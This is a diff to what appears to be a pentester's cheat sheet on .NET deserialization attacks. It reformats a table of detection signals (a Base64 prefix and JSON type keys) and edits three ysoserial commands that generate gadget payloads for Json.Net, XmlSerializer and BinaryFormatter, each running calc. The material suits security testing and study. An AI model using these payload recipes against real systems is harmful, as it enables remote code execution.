@@ -13,13 +13,11 @@
 
 ### .NET
 
-| Signal        | Value              |
-| ------------- | ------------------ |
-| Base64 prefix | `AAEAAAD/////`     |
-| JSON key      | `$type` / `__type` |
-| JSON key      | `TypeObject`       |
-
-## Look for cookie/parameter  `__viewstate`
+|Signal|Value|
+|---|---|
+|Base64 prefix|`AAEAAAD/////`|
+|JSON key|`$type` / `__type`|
+|JSON key|`TypeObject`|
 
 ---
 
@@ -67,9 +65,9 @@ python3 ~/Desktop/scripts/python-.../peas.py
 ### Examples
 
 ```powershell
-.\ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc" -o Raw
-.\ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "calc" -o Raw
-.\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc" -o base64
+wine .\ysoserial.exe -f Json.Net -g ObjectDataProvider -c "calc" -o Raw
+wine .\ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "calc" -o Raw
+wine .\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc" -o base64
 ```
 
 ---
